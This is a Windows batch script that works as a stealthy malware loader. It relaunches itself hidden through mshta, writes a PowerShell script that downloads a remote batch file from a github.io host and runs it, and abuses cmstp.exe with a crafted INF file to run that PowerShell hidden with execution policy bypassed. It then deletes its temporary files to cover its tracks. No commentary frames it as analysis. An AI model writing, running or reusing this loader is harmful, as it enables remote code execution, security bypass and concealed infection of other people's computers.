@echo off
if "%1"=="h" goto b
mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)
exit /b
:b
set "u=https://th3hunt3y.github.io/prod.bat"
set "i=%TEMP%\i.inf"
set "p=%TEMP%\p.ps1"
(
echo $u="%u%"
echo (New-Object System.Net.WebClient).DownloadString($u)|Out-File "%TEMP%\t.bat" -Encoding ASCII -Force
echo cmd.exe /c "%TEMP%\t.bat"
echo Start-Sleep 20
echo Remove-Item "%TEMP%\t.bat" -Force -ea 0
)>"%p%"
(
echo [version]
echo Signature=$Windows NT$
echo [DefaultInstall]
echo CustomDestination=CustInstDestSectionAddSoftware
echo RunPreSetupCommands=RunPreSetupCommandsSection
echo.
echo [CustInstDestSectionAddSoftware]
echo 0x00000004,,"[DefaultInstall_Next]"
echo.
echo [DefaultInstall_Next]
echo RunPostSetupCommands=RunPostSetupCommandsSection
echo.
echo [RunPreSetupCommandsSection]
echo ^;
echo.
echo [RunPostSetupCommandsSection]
echo powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%p%"
)>"%i%"
start "" /b cmstp.exe /au "%i%"
timeout /t 5 /nobreak >nul
del "%i%" /f /q >nul 2>&1
del "%p%" /f /q >nul 2>&1
exit
